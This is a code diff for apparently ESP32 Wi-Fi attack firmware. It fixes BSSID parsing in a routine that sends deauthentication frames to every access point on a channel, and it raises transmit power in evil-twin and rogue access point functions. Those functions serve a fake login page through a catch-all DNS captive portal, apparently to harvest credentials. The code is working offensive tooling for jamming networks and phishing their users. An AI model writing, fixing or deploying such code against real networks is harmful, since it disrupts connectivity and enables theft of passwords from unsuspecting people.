@@ -35,7 +35,7 @@ void startAP() {
   WiFi.mode(WIFI_MODE_AP);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
   WiFi.softAP(currentSSID.c_str(), currentPASS.c_str());
-  WiFi.setOutputPower(20.5);
+  WiFi.setTxPower(WIFI_TX_POWER_MAX);
   apActive = true;
   Serial.println("[AP] Started: " + currentSSID);
 }
@@ -104,8 +104,8 @@ void deauthAllTask(void* parameter) {
     for (int i = 0; i < n && attackActive; i++) {
       if (WiFi.channel(i) == channel) {
         uint8_t bssid[6];
-        WiFi.BSSID(i).toString().toUpperCase().toCharArray((char*)bssid, 18);
-        sscanf(WiFi.BSSIDstr(i).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+        String bssidStr = WiFi.BSSIDstr(i);
+        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
                &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
         sendDeauth(bssid, channel, 1);
       }
@@ -132,7 +132,7 @@ void startEvilTwin(const char* ssid, int channel) {
   WiFi.mode(WIFI_MODE_AP);
   WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
   WiFi.softAP(ssid, "");
-  WiFi.setOutputPower(20.5);
+  WiFi.setTxPower(WIFI_TX_POWER_MAX);
   
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", IPAddress(172, 217, 28, 254));
@@ -157,7 +157,7 @@ void startRogueAP(const char* ssid, const char* htmlContent) {
   WiFi.mode(WIFI_MODE_AP);
   WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
   WiFi.softAP(ssid, "");
-  WiFi.setOutputPower(20.5);
+  WiFi.setTxPower(WIFI_TX_POWER_MAX);
   
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", IPAddress(172, 217, 28, 254));
@@ -180,7 +180,7 @@ void startRogueAP(const char* ssid, const char* htmlContent) {
     server.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width'/><body style='text-align:center;padding:50px;font-family:Arial'><h2 style='color:#00aa00'>Login Successful!</h2><p>You are now connected.</p></body></html>");
   });
   
-  server.onNotFound([]() {
+  server.onNotFound([ssid, htmlContent]() {
     server.send(200, "text/html", String(htmlContent));
   });
   
